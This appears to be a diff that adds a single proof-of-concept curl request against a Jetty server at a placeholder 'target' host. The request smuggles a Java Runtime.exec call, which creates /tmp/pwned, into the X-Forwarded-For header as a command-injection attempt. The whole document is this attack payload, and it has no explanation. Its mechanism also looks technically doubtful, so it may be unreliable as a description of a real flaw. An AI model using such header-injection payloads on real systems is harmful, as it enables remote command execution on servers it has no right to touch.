@@ -1,0 +1,4 @@
+curl -X GET \
+  'http://target:8080/org.eclipse.jetty.server.HttpInput' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Forwarded-For: java.lang.Runtime.getRuntime().exec("touch /tmp/pwned");'
